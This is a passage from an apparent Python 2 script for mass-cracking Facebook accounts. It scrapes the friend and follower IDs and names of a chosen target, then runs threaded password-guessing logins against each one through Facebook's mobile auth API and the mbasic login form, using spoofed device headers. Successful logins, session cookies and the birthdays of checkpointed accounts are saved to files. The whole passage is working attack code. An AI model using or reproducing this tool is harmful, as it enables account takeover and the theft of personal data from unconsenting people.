    print '\xe2\x94\x9c        \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98       \xe2\x94\xa4'
    print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
    print '\xe2\x94\x9c * To Stop The Cracking Process Press CTRL+Z  * \xe2\x94\xa4'
    print '\xe2\x94\x9c * Idz File Will Be Saved In Files Folder     * \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c     *** Wait! Idz File Is Being Created ***    \xe2\x94\xa4\n'
    try:
        dprocess('.lpp', limit, filex)
    except Exception as e:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Id Not Found!'
        time.sleep(2)


def dprocess(file, lim, savefile):
    try:
        list_akun = open(file).read().splitlines()
        with zthreads(max_workers=5) as (su):
            try:
                for akun in list_akun:
                    akn = akun.split('<=>')
                    try:
                        su.submit(cfiles, akn[0], savefile)
                    except (KeyboardInterrupt, EOFError):
                        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Creation Stopped! Try Again'
                        time.sleep(2)

            except (KeyError, IOError):
                print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Creation Has Been Completed'
                time.sleep(2)

    except (KeyError, IOError):
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Creation Failed! Try Again'
        time.sleep(2)


def cfiles(idt, save):
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('clear')
        os.system('rm -rf login.txt')
        zmbf()

    r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (idt, token))
    z = json.loads(r.text)
    try:
        qqq = ('Files/' + save + '.json').replace(' ', '_')
        yss = open(qqq, 'a+')
        for i in z['friends']['data']:
            uid = i['id']
            na = i['name']
            nama = i['name']
            id.append(uid + '<=>' + na)
            yss.write(uid + '<=>' + na + '\n')

        yss.close()
    except KeyError:
        pass

    try:
        pfriends = '%s' % str(len(id))
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        (sys.stdout.write('\r%s[\xe2\x9e\xa5] Getting Idz From Public Friends: %s ' % (w, pfriends)),)
        sys.stdout.flush()
    except Exception as e:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Id Not Found!'
        time.sleep(2)


def cof():
    os.system('clear')
    print zmbflogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              File Creation Menu \t         \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Public Id: ')
    if idt == ' ' or idt == '':
        cuf(token)
    limit = '9999999999'
    filex = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Saving File Name: ')
    if filex == ' ' or filex == '':
        cuf(token)
    try:
        token = open('login.txt', 'r').read()
    except Exception as e:
        print k + '[' + p + '!' + k + ']' + p + ' Saving File Error! Try Again : %s' % e,
        time.sleep(1)
        logs()

    try:
        os.mkdir('Files')
    except:
        pass

    r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (idt, token))
    z = json.loads(r.text)
    try:
        qqq = ('.lpp').replace(' ', '_')
        yss = open(qqq, 'w')
        for i in z['friends']['data']:
            uid = i['id']
            na = i['name']
            id.append(uid + '<=>' + na)
            yss.write(uid + '<=>' + na + '\n')

        yss.close()
        old = '%s' % str(len(id))
        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Total Public Friends: %s' % len(id))
        print '\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] File Will Be Saved With The Name: Files/' + filex + '.json'
        time.sleep(1)
    except:
        pass

    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c        \xe2\x94\x9c File Creation Process Started \xe2\x94\xa4       \xe2\x94\xa4'
    print '\xe2\x94\x9c        \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98       \xe2\x94\xa4'
    print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
    print '\xe2\x94\x9c * To Stop The Cracking Process Press CTRL+Z  * \xe2\x94\xa4'
    print '\xe2\x94\x9c * Idz File Will Be Saved In Files Folder     * \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c     *** Wait! Idz File Is Being Created ***    \xe2\x94\xa4\n'
    try:
        dprocesso('.lpp', limit, filex)
    except Exception as e:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Id Not Found!'
        time.sleep(2)


def dprocesso(file, lim, savefile):
    try:
        list_akun = open(file).read().splitlines()
        with zthreads(max_workers=5) as (su):
            try:
                for akun in list_akun:
                    akn = akun.split('<=>')
                    try:
                        su.submit(cofiles, akn[0], savefile)
                    except (KeyboardInterrupt, EOFError):
                        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Creation Stopped! Try Again'
                        time.sleep(2)

            except (KeyError, IOError):
                print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Creation Has Been Completed'
                time.sleep(2)

    except (KeyError, IOError):
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Creation Failed! Try Again'
        time.sleep(2)


def cofiles(idt, save):
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('clear')
        os.system('rm -rf login.txt')
        zmbf()

    r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (idt, token))
    z = json.loads(r.text)
    try:
        qqq = ('Files/' + save + '.json').replace(' ', '_')
        yss = open(qqq, 'a+')
        for a in z['friends']['data']:
            if a['id'][:6] in ('100001', ):
                id.append(a['id'] + '<=>' + a['name'])
                yss.write(a['id'] + '<=>' + a['name'] + '\n')

        yss.close()
    except KeyError:
        pass

    try:
        old = '%s' % str(len(id))
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        (sys.stdout.write('\r%s[\xe2\x9e\xa5] Getting Old Idz From Public Friends: %s ' % (w, old)),)
        sys.stdout.flush()
    except Exception as e:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Creation Failed! Try Again'
        time.sleep(2)


def friends(token):
    os.system('clear')
    print cracklogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              Cracking From Friends             \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    try:
        pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Your Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] User Id Not Found!'
        time.sleep(2)
        friends(token)

    try:
        filen = 'idz.json'
        zk = open(filen, 'w')
        rex = requests.get('https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s' % token)
        ex = json.loads(rex.text)
        for a in ex['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        crackmenu().passmenu()
    except (KeyError, IOError):
        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Friends Idz Not Found! Try Again!'
        time.sleep(2)
        friends(token)


def myfoll(token):
    os.system('clear')
    print cracklogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              Cracking From Followers           \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    try:
        pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Your Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] User Id Not Found!'
        time.sleep(2)
        myfoll(token)

    try:
        filen = 'idz.json'
        zk = open(filen, 'w')
        rex = requests.get('https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s' % token)
        ex = json.loads(rex.text)
        for a in ex['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        crackmenu().passmenu()
    except (KeyError, IOError):
        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Followers Idz Not Found! Try Again!'
        time.sleep(2)
        myfoll(token)


def public(token):
    os.system('clear')
    print cracklogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c         Cracking From Public Friends           \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Public Id: ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Target Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Id Not Found!'
        time.sleep(2)
        public(token)

    try:
        filen = 'idz.json'
        zk = open(filen, 'w')
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (idt, token))
        ex = json.loads(rex.text)
        for a in ex['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        crackmenu().passmenu()
    except (KeyError, IOError):
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Idz Not Found! Try Again!'
        time.sleep(2)
        public(token)


def pfoll(token):
    os.system('clear')
    print cracklogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c          Cracking From Public Followers        \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Public Id: ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Target Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Id Not Found!'
        time.sleep(2)
        pfoll(token)

    try:
        filen = 'idz.json'
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s' % (idt, token)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        crackmenu().passmenu()
    except (KeyError, IOError):
        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Followers Not Found! Try Again!'
        time.sleep(2)
        pfoll(token)


def change_country():
    os.system('rm -rf country.txt')
    os.system('clear')
    print zmbflogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c            \xe2\x94\x9c Changing Your Country \xe2\x94\xa4\t         \xe2\x94\xa4'
    print '\xe2\x94\x9c            \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98           \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    print '\n\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] For Example: Pakistan,Indonesia,India, etc'
    country = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Your Country Name: ')
    ctry = open('country.txt', 'w')
    ctry.write(country)
    ctry.close()
    print '\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Your Country Name Has Been Saved As:' + country
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    land = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Press Enter To Go To The Cracking Menu: ')
    cracking_menu()


class crackmenu():

    def __init__(self):
        self.id = []

    def passmenu(self):
        try:
            self.id = open('idz.json', 'r').read().splitlines()
        except:
            pass

        zks('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Total Public Id Friends: ' + str(len(self.id)))
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c               \xe2\x94\x9c Password Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c               \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                \xe2\x94\xa4'
        print '\xe2\x94\x9c [01]. For Default Passwords Press (D/d)        \xe2\x94\xa4'
        print '\xe2\x94\x9c [02]. For Manual  Passwords Press (M/m)        \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        zk = raw_input(' \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
        if zk in ('M', 'm', '2', '02'):
            os.system('clear')
            print cracklogo
            print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
            print '\xe2\x94\x9c             \xe2\x94\x9c Manual Password Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
            print '\xe2\x94\x9c             \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98           \xe2\x94\xa4'
            print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
            print '\x1b[0;97m [\xe2\x9e\xa3] Enter Password Like: 786786,000786,102030'
            while True:
                pwx = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Manual Password: ')
                zks('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Applying Passwords: \x1b[0;92m%s' % pwx)
                print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
                print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
                print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
                print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
                print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
                print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
                print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
                print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
                print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
                print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
                print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
                if pwx == '':
                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Password Can Not Be Empty')
                elif len(pwx) <= 5:
                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Password Must Be Six Digits or Characters Long')
                else:

                    def zkth(zsc=None):
                        global cp
                        global ok
                        with zthreads(max_workers=30) as (form):
                            for zuid in self.id:
                                try:
                                    userid = zuid.split('<=>')[0]
                                    form.submit(self.apiz, userid, zsc)
                                except:
                                    pass

                        results(ok, cp)

                    zkth(pwx.split(','))
                    break

        elif zk in ('D', 'd', '1', '01'):
            self.country_menu()
        else:
            print '  [!] Wrong Input! Try Again'
            time.sleep(2)
            cracking_menu()
        return

    def apiz(self, user, zkth):
        global loop
        ua5 = 'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
        ua = random.choice(['Mozilla/5.0 (Linux; Android 10; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
        ua1 = random.choice(['Mozilla/5.0 (Linux; Android 10; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]', 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/031.023; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3.1'])
        ua2 = 'Mozilla/5.0 (Linux; Android 10; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]'
        ua6 = random.choice(['Mozilla/5.0 (Linux; Android 10; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/031.023; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3.1'])
        ua3 = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/031.023; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3.1'
        ua4 = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        (
         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in zkth:
            pw = pw.lower()
            try:
                os.mkdir('Cracked')
            except:
                pass

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r%s[OK]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s' % (H, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                ok.append(wrt)
                open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    loginz = open('login.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday'].replace('/', '-')
                    print '\r%s[CP]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                    wrt = '%s | %s | %s' % (user, pw, dob)
                    cp.append(wrt)
                    open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ''
                except:
                    pass

                print '\r%s[CP]: %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                cp.append(wrt)
                open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mbasicz(self, user, zkth):
        global loop
        ua = 'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977'
        ua1 = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537', 'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586', 'Mozilla/5.0 (Linux; Android 10; Infinix X657B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.56 Mobile Safari/537.36'])
        (
         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in zkth:
            pw = pw.lower()
            try:
                os.mkdir('Cracked')
            except:
                pass

            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = '%s | %s ' % (user, pw)
                ok.append(wrt)
                open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    loginz = open('login.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday'].replace('/', '-')
                    print '\r%s[CP]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                    wrt = '%s | %s | %s' % (user, pw, dob)
                    cp.append(wrt)
                    open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ''
                except:
                    pass

                print '\r%s[CP]: %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                cp.append(wrt)
                open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def country_menu(self):
        os.system('clear')
        print zmbflogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c                 \xe2\x94\x9c Country Menu \xe2\x94\xa4\t\t\t\t\xe2\x94\xa4'
        print '\xe2\x94\x9c                 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98               \xe2\x94\xa4'
        print '\xe2\x94\x9c [01] Crack From Pakistan                       \xe2\x94\xa4'
        print '\xe2\x94\x9c [02] Crack From Indonesia                      \xe2\x94\xa4'
        print '\xe2\x94\x9c [03] Crack From India                          \xe2\x94\xa4'
        print '\xe2\x94\x9c [04] Crack From Bangladesh                     \xe2\x94\xa4'
        print '\xe2\x94\x9c [05] Crack From Usa                            \xe2\x94\xa4'
